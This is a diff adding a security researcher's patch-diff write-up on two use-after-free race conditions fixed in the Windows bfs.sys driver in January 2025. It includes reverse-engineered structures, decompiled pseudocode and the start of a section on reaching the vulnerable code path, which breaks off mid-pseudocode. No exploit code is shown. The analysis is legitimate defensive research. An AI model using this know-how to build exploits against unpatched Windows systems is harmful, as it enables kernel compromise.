@@ -1,0 +1,975 @@
+<h1 id="brokering-file-system-bfs-january-2025-patch-analysis">Brokering
+File System (BFS) January 2025 Patch Analysis</h1>
+<link rel="stylesheet" href="style.css">
+<style>
+  img {
+    display: block;
+    margin: 0 auto;
+    max-width: 100%;
+    height: auto;
+  }
+</style>
+<h2 id="brokering-file-system-overview">Brokering File System
+Overview</h2>
+<p>The Microsoft Windows Brokering File System (bfs.sys) driver if a file system Minifilter which brokers (manages) access to the broader file system for <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/appcontainer-isolation">AppContainer</a> and <a href="https://learn.microsoft.com/en-us/windows/uwp/">Universal Windows Platform</a> applications. By intercepting various I/O calls such as file creation, pipe creation, registry creation, the driver can act as a trusted mediator (broker) between the restricted application and the overall file system.</p>
+<h2 id="patch-overview">Patch Overview</h2>
+<p><a href="https://support.microsoft.com/help/5050009">KB5050009</a> and <a href="https://support.microsoft.com/help/5049984">KB5049984</a> are two security updates released by Microsoft on the 14th of January 2025. The updates address different operating systems with <code>KB5050009</code> addressing Windows 11 / Windows Server 2025 systems where as <code>KB5049984</code> addresses Windows Server 2022, 23H2 Edition. These updates address two distinct Use After Free (UAF) vulnerabilities triggerable through race conditions.</p>
+<ul>
+<li><a
+href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21372">CVE-2025-21372</a>
+- A logic issue regarding incorrect lock placement on the
+<code>PipeMappingTable</code> Object</li>
+<li><a
+href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21315">CVE-2025-21315</a>
+- Missing lock placements on the <code>PolicyTable</code> object in
+various code paths</li>
+</ul>
+<h2 id="diffing-the-patch">Diffing the Patch</h2>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>For ease of setup and use, <code>Windows 11 Version 24H2</code> was utilized to be the target of the patch diffing process. The Windows Binary Index (<a href="https://winbindex.m417z.com/">Winbindex</a>) was utilized to download the vulnerable and patched versions of the <code>bfs.sys</code> driver.</p>
+<p><strong>Pre Patch:</strong> 10.0.26100.2454 <strong>Post
+Patch:</strong> 10.0.26100.2894</p>
+<p>The drivers were then renamed to <code>before.sys</code> and <code>after.sys</code> for the binary versions before and after the patch respectively. The drivers were then loaded into IDA Pro and symbols were then retrieved from the Microsoft Symbol Store for the versions. Next <a href="https://github.com/google/bindiff">BinDiff</a> was utilized to perform binary diffing using the IDA Plugins.</p>
+<figure>
+<img src="BFSJanImg/image.png" alt="alt text" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<p><strong>BinDiff Call Graph Analysis of the Drivers</strong></p>
+<p>In addition to the Call Graph changes, the new driver version
+(<code>after.sys</code>) introduces five new functions as shown
+below:</p>
+<ul>
+<li>Feature_2880249144__private_IsEnabledDeviceUsageNoInline</li>
+<li>Feature_2880249144__private_IsEnabledFallback</li>
+<li>BfsDereferencePolicyEntryEx</li>
+<li>Feature_752421176__private_IsEnabledDeviceUsageNoInline</li>
+<li>Feature_752421176__private_IsEnabledFallback</li>
+</ul>
+<p><img src="BFSJanImg/image-1.png" alt="alt text" /> <strong>Newly Introduced Functions After Patch</strong></p>
+<p>Review of the matched functions reveals that a total of 15 functions have been modified post patch as shown in the list and image below:</p>
+<ul>
+<li>BfsReleaseNamedPipeMapping</li>
+<li>BfsRemovePolicyEntry</li>
+<li>BfsUninitializePolicyTable</li>
+<li>BfsInsertPolicyEntry</li>
+<li>BfsCheckAndReleaseIdlePolicy</li>
+<li>BfsDeleteFileFromGlobalFileTable</li>
+<li>BfsGetPolicyEntry</li>
+<li>BfsProcessSetPolicyRequest</li>
+<li>BfsCheckAndApplyPolicy</li>
+<li>BfsGetRegistryPrefix</li>
+<li>BfsProcessQueryPolicySizeRequest</li>
+<li>BfsInsertNotPresentPolicyEntry</li>
+<li>BfsPostCreateOperation</li>
+<li>BfsProcessQueryPolicyRequest</li>
+<li>BfsPerformPrompt</li>
+</ul>
+<p><img src="BFSJanImg/image-2.png" alt="alt text" /> <strong>Matched and Modified Functions</strong></p>
+<h3 id="cve-2025-21372">CVE-2025-21372</h3>
+<p>The <code>Feature_752421176__private_IsEnabledDeviceUsageNoInline</code> which will be renamed <code>CVE_2025_21372_Patch</code> calls the internal function <code>Feature_752421176__private_IsEnabledFallback</code> which will be renamed <code>CVE_2025_21372_Patch_Fallback</code>. References to <code>CVE_2025_21372_Patch</code> only exist in the <code>BfsReleaseNamedPipeMapping</code> function. Review of the patched under <code>BinDiff</code> shows addition of the <code>CVE_2025_21372_Patch</code> call twice. In the beginning of the function and in the tail end. The patch appears to be dictating when the <code>PipeMappingTable</code> lock is being placed and released.</p>
+<p><img src="BFSJanImg/image-3.png" alt="alt text" /> <strong>Pre and Post Patch Graph of <code>BfsReleaseNamedPipeMapping</code></strong></p>
+<p>The <code>PipeMappingTable</code> object is referenced in <code>BfsInitializePipeMappingTable</code> along with other functions. The <code>BfsInitializePipeMappingTable</code> logic was reverse engineered to understand the type definition of the <code>PipeMappingTable</code>. This resulted in the following structure:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> PipeMappingTable</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    __int64 PipePushLock<span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    PRTL_DYNAMIC_HASH_TABLE PipeMappingHashTable<span class="op">;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
+<p><strong><code>PipeMappingTable</code> Typedef</strong></p>
+<p>Additionally <code>BfsInsertNamedPipeMapping</code> was reverse engineered along with other operations to get a sample type definition of a <code>PipeEntry</code> structure. This resulted in the following structure:</p>
+<pre><code>struct PipeEntry
+{
+    RTL_DYNAMIC_HASH_TABLE_ENTRY HashTableEntry;
+    DWORD RefCt;
+    DWORD UnkDword;
+    __int64 ProbUserSid;
+    __int64 ProbAppContainerSid;
+    UNICODE_STRING ProbFilePath;
+    UNICODE_STRING UnkString;
+};</code></pre>
+<p><strong><code>PipeEntry</code> Typedef</strong></p>
+<p>Finally, the <code>BfsReleaseNamedPipeMapping</code> function was reviewed again to understand the error in depth. The bug behind <code>CVE-2025-21372</code> stems from decrementing a <code>PipeEntry</code> object reference count prior to acquiring a lock on the <code>PipeMappingTable</code> object as observed in the pseudocode below:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> __fastcall BfsReleaseNamedPipeMapping<span class="op">(</span>PipeMappingTable <span class="op">*</span>PipeMappingTable<span class="op">,</span> PipeEntry <span class="op">*</span>PipeEntry<span class="op">)</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>CVE_2025_21372_Patch<span class="op">()</span> <span class="op">)</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    KeEnterCriticalRegion<span class="op">();</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    ExAcquirePushLockExclusiveEx<span class="op">(</span>PipeMappingTable<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> _InterlockedExchangeAdd<span class="op">((</span><span class="dt">volatile</span> <span class="dt">signed</span> __int32 <span class="op">*)&amp;</span>PipeEntry<span class="op">-&gt;</span>RefCt<span class="op">,</span> <span class="bn">0xFFFFFFFF</span><span class="op">)</span> <span class="op">==</span> <span class="dv">1</span> <span class="op">)</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>CVE_2025_21372_Patch<span class="op">()</span> <span class="op">)</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>      KeEnterCriticalRegion<span class="op">();</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>      ExAcquirePushLockExclusiveEx<span class="op">(</span>PipeMappingTable<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>PipeEntry<span class="op">-&gt;</span>RefCt <span class="op">)</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span>PipeEntry<span class="op">-&gt;</span>UnkDword <span class="op">&amp;</span> <span class="dv">1</span><span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>        BfsRemoveEntryHashTable<span class="op">(</span>PipeMappingTable<span class="op">-&gt;</span>PipeMappingHashTable<span class="op">,</span> <span class="op">&amp;</span>PipeEntry<span class="op">-&gt;</span>HashTableEntry<span class="op">);</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>      ExFreePoolWithTag<span class="op">((</span>PVOID<span class="op">)</span>PipeEntry<span class="op">-&gt;</span>ProbUserSid<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>      ExFreePoolWithTag<span class="op">((</span>PVOID<span class="op">)</span>PipeEntry<span class="op">-&gt;</span>ProbAppContainerSid<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>      RtlFreeUnicodeString<span class="op">(&amp;</span>PipeEntry<span class="op">-&gt;</span>ProbFilePath<span class="op">);</span></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>      RtlFreeUnicodeString<span class="op">(&amp;</span>PipeEntry<span class="op">-&gt;</span>UnkString<span class="op">);</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>      ExFreePoolWithTag<span class="op">(</span>PipeEntry<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>CVE_2025_21372_Patch<span class="op">()</span> <span class="op">)</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>      ExReleasePushLockExclusiveEx<span class="op">(</span>PipeMappingTable<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>      KeLeaveCriticalRegion<span class="op">();</span></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>CVE_2025_21372_Patch<span class="op">()</span> <span class="op">)</span></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>    ExReleasePushLockExclusiveEx<span class="op">(</span>PipeMappingTable<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a>    KeLeaveCriticalRegion<span class="op">();</span></span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsReleaseNamedPipeMapping</code> Pseudocode</strong></p>
+<p>The data race can occur when two simultaneous threads have an open handle to a named pipe (reference count of 2). Thread A, will initially lock the reference count and decrement it then release the lock, and acquire a <code>PipeMappingTable</code> lock. Thread B will then decrement the reference count and wait for the <code>PipeMappingTable</code> lock release. Thread A will then free the <code>PipeEntry</code> object and unlock the table. Thread B will then lock the table and a Use-After-Free will occur when it performs the reference count check <code>if ( !PipeEntry-&gt;RefCt )</code>. The UAF logic can be seen in the diagram below:</p>
+<p><img src="BFSJanImg/image-10.png" alt="alt text" /> <strong>CVE-2025-21372 Use-After-Free Logic</strong></p>
+<h3 id="cve-2025-21315">CVE-2025-21315</h3>
+<p><code>Feature_2880249144__private_IsEnabledDeviceUsageNoInline</code> which will be renamed <code>CVE_2025_21315_Patch</code> calls the internal function <code>Feature_2880249144__private_IsEnabledFallback</code> which will be renamed <code>CVE_2025_21315_Patch_Fallback</code>. Twenty references exist to <code>CVE_2025_21315_Patch</code> in the driver. All references follow a particular pattern of checking if <code>CVE_2025_21315_Patch</code> returns true the new <code>BfsDereferencePolicyEntryEx</code> will get called otherwise the old <code>BfsDereferencePolicyEntry</code> will get called.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>CVE_2025_21315_Patch<span class="op">()</span> <span class="op">)</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>      BfsDereferencePolicyEntryEx<span class="op">(</span>PolicyEntry<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>      BfsDereferencePolicyEntry<span class="op">((</span><span class="dt">char</span> <span class="op">*)</span>PolicyEntry<span class="op">);</span></span></code></pre></div>
+<p><strong><code>BfsProcessQueryPolicyRequest</code>:149-152</strong></p>
+<p>Review of some of the matched patch functions (Excluding <code>BfsReleaseNamedPipeMapping</code>) using BinDiff show the same behavior as shown below:</p>
+<p><img src="BFSJanImg/image-4.png" alt="alt text" />
+<strong><code>BfsCheckAndApplyPolicy</code> Diff</strong></p>
+<p><img src="BFSJanImg/image-5.png" alt="alt text" />
+<strong><code>BfsProcessSetPolicyRequest</code> Diff</strong></p>
+<p><img src="BFSJanImg/image-6.png" alt="alt text" />
+<strong><code>BfsPostCreateOperation</code> Diff</strong></p>
+<p>Two key differences exist between <code>BfsDereferencePolicyEntry</code> and the new <code>BfsDereferencePolicyEntryEx</code> function. First <code>BfsDereferencePolicyEntryEx</code> accepts a new <code>BOOL</code> parameter (which will be named <code>TableLocked</code>) as a second argument following <code>PolicyEntry</code> where as the initial function does not. Review of the function code also shows new code was added to lock the <code>PolicyTable</code> prior to operations on the
+<code>PolicyEntry</code> object.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>TableLocked <span class="op">)</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    KeEnterCriticalRegion<span class="op">();</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    ExAcquirePushLockExclusiveEx<span class="op">(&amp;</span>gBfsPolicyTable<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsDereferencePolicyEntryEx</code>: 13-17</strong></p>
+<p><code>BfsInitializePolicyTable</code> and <code>BfsInsertPolicyEntry</code> were along with their cross-references were then reverse engineered to identify the <code>PolicyTable</code> and <code>PolicyEntry</code> structures types.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> PolicyTable</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    __int64 PolicyTablePushLock<span class="op">;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>    PRTL_DYNAMIC_HASH_TABLE HashTable<span class="op">;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>    LIST_ENTRY Entries<span class="op">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    PEX_TIMER PolicyTimer<span class="op">;</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
+<p><strong><code>PolicyTable</code> Structure</strong></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> PolicyEntry</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    RTL_DYNAMIC_HASH_TABLE_ENTRY HashEntry<span class="op">;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    __int64 TokenUserSid<span class="op">;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    __int64 AppContainerSid<span class="op">;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    __int64 Object<span class="op">;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    __int64 StorObject<span class="op">;</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    __int32 unkFlag<span class="op">;</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>    __int32 unkDWORD0<span class="op">;</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>    LIST_ENTRY UnkListEntry<span class="op">;</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    __int64 unkPTR0<span class="op">;</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    __int64 unkPTR1<span class="op">;</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    __int64 LastAccessTime<span class="op">;</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>    __int32 unkDWORD1<span class="op">;</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>    __int32 unkDWORD2<span class="op">;</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>    UNICODE_STRING RegString1<span class="op">;</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>    UNICODE_STRING RegString2<span class="op">;</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>    DWORD ReferenceCount<span class="op">;</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>    __int32 unkDWORD3<span class="op">;</span></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
+<p><strong><code>PolicyEntry</code> Structure</strong> 
+<h2 id="triggering-CVE-2025-21372">Triggering CVE-2025-21372</h2> </p>
+<p>To trigger <code>CVE-2025-21372</code> the vulnerable <code>BfsReleaseNamedPipeMapping</code> function was cross-referenced and was observed to be used in the following functions:</p>
+<ul>
+<li>BfsPreCreatePipeOperation</li>
+<li>BfsPostCreatePipeOperation</li>
+<li>BfsNamedPipeStreamHandleCleanup</li>
+<li>BfsPreCreateOperation</li>
+</ul>
+<h3 id="pipemapping-creation">PipeMapping Creation</h3>
+<p>In addition to <code>BfsReleaseNamedPipeMapping</code>, <code>BfsInsertNamedPipeMapping</code> was cross referenced and was only used in <code>BfsPostCreatePipeOperation</code>. Named pipe mappings are only inserted into the <code>PipeMappingTable</code> after a successful status is verified in the <code>BfsPostCreatePipeOperation</code> filter callback.</p>
+<p>Successful named <code>PipeEntry</code> creation if dependent heavily on 2 important factors:</p>
+<ul>
+<li>Token is part of an Application Silo</li>
+<li>Token has correct permissions to perform operation</li>
+</ul>
+<p><code>BfsPreCreatePipeOperation</code> is responsible for intercepting named pipe creation operations prior to forwarding to the operation to the File System Driver. The pseudocode for the function can be seen below:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall BfsPreCreatePipeOperation<span class="op">(...</span> params <span class="op">...)</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Start rundown protection / acquiring token info</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ... snip ...</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>  <span class="co">// #1 TokenIsAppSilo (0x30) Check Against Token</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> BfsIsApplicableToken<span class="op">(</span>Token<span class="op">)</span> <span class="op">)</span> </span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>  <span class="co">// FLT_FILE_NAME_QUERY_DEFAULT | FLT_FILE_NAME_NORMALIZED</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>  status <span class="op">=</span> FltGetFileNameInformation<span class="op">(</span>CallbackData<span class="op">,</span> <span class="bn">0x101</span><span class="bu">u</span><span class="op">,</span> <span class="op">&amp;</span>FileNameInformation<span class="op">);</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>  <span class="co">//  ... snip ...</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>  FileName <span class="op">=</span> <span class="op">*</span>BfsGetFileName<span class="op">(&amp;</span>Str<span class="op">,</span> FileNameInformation<span class="op">);</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>  <span class="co">// #2 Confirms FileName Doesnt start with &quot;Sessions\&quot; and &quot;LOCAL\&quot; (case sensitive)</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> BfsIsPrefixRequired<span class="op">(&amp;</span>FileName<span class="op">)</span> <span class="op">)</span> </span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>  GetEcpStatus <span class="op">=</span> SeQueryInformationToken<span class="op">(</span>Token<span class="op">,</span> TokenUser<span class="op">,</span> <span class="op">&amp;</span>TokenUserSid<span class="op">);</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> GetEcpStatus <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>    GetEcpStatus <span class="op">=</span> SeQueryInformationToken<span class="op">(</span>Token<span class="op">,</span> TokenAppContainerSid<span class="op">,</span> <span class="op">&amp;</span>AppContainerSid<span class="op">);</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> GetEcpStatus <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a>      <span class="co">// FILE_OPEN</span></span>
+<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span>CallbackData<span class="op">-&gt;</span>Iopb<span class="op">-&gt;</span>Parameters<span class="op">.</span>Create<span class="op">.</span>Options <span class="op">&amp;</span> <span class="bn">0xFF000000</span><span class="op">)</span> <span class="op">==</span> <span class="bn">0x1000000</span> <span class="op">)</span></span>
+<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a>      <span class="op">{</span></span>
+<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ... snip ... </span></span>
+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>      <span class="co">// #3 Cleaning up path and patch callback (to include &quot;\Local\&quot;)</span></span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>      v6 <span class="op">=</span> <span class="op">((</span>BfsRedirectNamedPipe<span class="op">(</span></span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>              FltRelatedObj<span class="op">-&gt;</span>Filter<span class="op">,</span></span>
+<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a>              CallbackData<span class="op">,</span></span>
+<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a>              <span class="op">*</span>TokenUserSid<span class="op">,</span></span>
+<span id="cb8-32"><a href="#cb8-32" aria-hidden="true" tabindex="-1"></a>              <span class="op">*</span>AppContainerSid<span class="op">,</span></span>
+<span id="cb8-33"><a href="#cb8-33" aria-hidden="true" tabindex="-1"></a>              FileNameInformation<span class="op">,</span></span>
+<span id="cb8-34"><a href="#cb8-34" aria-hidden="true" tabindex="-1"></a>              <span class="op">&amp;</span>FileName<span class="op">)</span> <span class="op">&gt;&gt;</span> <span class="dv">31</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xFFFFFFFD</span><span class="op">)</span></span>
+<span id="cb8-35"><a href="#cb8-35" aria-hidden="true" tabindex="-1"></a>        <span class="op">+</span> <span class="dv">4</span><span class="op">;</span></span>
+<span id="cb8-36"><a href="#cb8-36" aria-hidden="true" tabindex="-1"></a>      <span class="cf">goto</span> LABEL_6<span class="op">;</span></span>
+<span id="cb8-37"><a href="#cb8-37" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb8-39"><a href="#cb8-39" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
